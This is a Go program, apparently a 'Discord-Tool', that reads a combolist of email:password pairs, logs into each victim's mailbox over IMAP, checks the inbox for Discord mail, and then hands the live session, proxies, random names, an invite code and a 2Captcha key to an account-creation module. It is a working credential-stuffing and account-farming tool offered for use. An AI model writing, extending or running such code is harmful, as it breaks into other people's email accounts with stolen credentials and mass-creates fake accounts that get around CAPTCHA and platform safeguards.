package main

import (
	Modules "Discord-Tool/Modules"
	"bufio"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"strings"
	"time"

	"github.com/emersion/go-imap"
	"github.com/emersion/go-imap/client"
	"github.com/fatih/color"
)

var (
	blue    = color.New(color.FgBlue).SprintFunc()
	red     = color.New(color.FgRed).SprintFunc()
	yellow  = color.New(color.FgYellow).SprintFunc()
	green   = color.New(color.FgHiGreen).SprintFunc()
	magenta = color.New(color.FgMagenta).SprintFunc()
	bbb     = color.New(color.FgHiRed).SprintFunc()
	cyan    = color.New(color.FgCyan).SprintFunc()
	c       *client.Client
)

// Sacn this shit
func Scan(username string, passowrd string, addr string) bool {
	select {
	case <-time.After(5 * time.Second):
		break
	}
	cone, err := client.DialTLS(addr, nil)
	if err != nil {
		Modules.Log(fmt.Sprintf("%s", err), "IMAP", "error")
		return false
	}

	c = cone

	// Don't forget to logout
	// defer c.Logout()

	// Login
	if err := c.Login(username, passowrd); err != nil {
		Modules.Log("invalid credentials or IMAP is disabled", "Auth", "bad")
		return false
	}

	// List mailboxes
	mailboxes := make(chan *imap.MailboxInfo, 10)
	done := make(chan error, 1)
	go func() {
		done <- c.List("", "*", mailboxes)
	}()

	if err := <-done; err != nil {
		Modules.Log(fmt.Sprintf("%s", err), "Err", "error")
		return false
	}

	// Select INBOX
	mbox, err := c.Select("INBOX", false)
	if err != nil {
		Modules.Log(fmt.Sprintf("%s", err), "Err", "error")
		return false
	}
	// Get the last 4 messages
	from := uint32(1)
	to := mbox.Messages
	if mbox.Messages > 999 {
		// We're using unsigned integers here, only substract if the result is > 0
		from = mbox.Messages - 999
	}
	seqset := new(imap.SeqSet)
	seqset.AddRange(from, to)

	messages := make(chan *imap.Message, 10)
	done = make(chan error, 1)
	go func() {
		done <- c.Fetch(seqset, []imap.FetchItem{imap.FetchEnvelope}, messages)
	}()

	for msg := range messages {
		if strings.Contains(msg.Envelope.Subject, "Discord") {
			return false
		}
	}

	return true
}

func main() {
	Modules.Logo()
	fmt.Fprintf(color.Output, "%s%s%s %s%s (%s/%s) ", blue("["), bbb("+"), blue("]"), magenta("do you want to use default settings"), cyan("?"), green("Y"), red("n"))
	var op string
	fmt.Scanln(&op)

	// Classes
	var comboList string
	var invite string
	out := new(Modules.Reader)
	config, err := Modules.LoadConfiguration("Setting.json")
	names := new(Modules.Reader)
	names.File = "Files/Names.txt"
	names.Read()

	if strings.HasPrefix(strings.ToLower(op), "n") {
		fmt.Fprintf(color.Output, "%s%s%s Proxies File %s ", yellow("["), green("+"), yellow("]"), magenta(">>"))
		var filename string

		fmt.Scanf("%d\n", &filename)

		if err != nil {
			fmt.Println(err)
		}

		out.File = filename

		fmt.Fprintf(color.Output, "%s%s%s Combolist File %s ", yellow("["), green("+"), yellow("]"), magenta(">>"))
		fmt.Scanln(&comboList)

		fmt.Fprintf(color.Output, "%s%s%s Invite code %s ", yellow("["), green("+"), yellow("]"), magenta(">>"))
		fmt.Scanln(&invite)
	} else {
		comboList = config.Combolist
		invite = config.Invite
		out.File = config.ProxyFile
	}

	out.Read()

	jsonFile, err := os.Open("Files/Servers.json")
	// if we os.Open returns an error then handle it
	if err != nil {
		fmt.Println(err)
	}
	fmt.Fprintf(color.Output, "%s%s%s All files has Successfully loaded\n\n", yellow("["), green("+"), yellow("]"))
	// defer the closing of our jsonFile so that we can parse it later on
	defer jsonFile.Close()

	byteValue, _ := ioutil.ReadAll(jsonFile)

	var imaphost map[string]interface{}
	json.Unmarshal([]byte(byteValue), &imaphost)

	file, err := os.Open(comboList)
	if err != nil {
		log.Fatalf("Failed to open combolist")

	}
	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)
	for scanner.Scan() {
		combo := strings.Split(scanner.Text(), ":")
		if imaphost[strings.Split(combo[0], "@")[1]] == nil {
			continue
		}
		// start
		c1 := make(chan string, 1)

		// Run your long running function in it's own goroutine and pass back it's
		// response into our channel.
		go func() {
			text := Scan(combo[0], combo[1], imaphost[strings.Split(combo[0], "@")[1]].(string))
			c1 <- fmt.Sprintf("%v", text)
		}()

		// Listen on our channel AND a timeout channel - which ever happens first.
		select {
		case res := <-c1:
			if res == "true" {
				fmt.Fprintf(color.Output, "%s%s%s Logged into %s\n", magenta("["), cyan("+"), magenta("]"), combo[0])
				Modules.Creator(c, out, names, combo, invite, config.TwoCaptcha)
				c.Logout()
			}
		case <-time.After(20 * time.Second):
			Modules.Log(imaphost[strings.Split(combo[0], "@")[1]].(string)+" out of time", "Timeout", "bad")
		}
		//ednd
	}
}
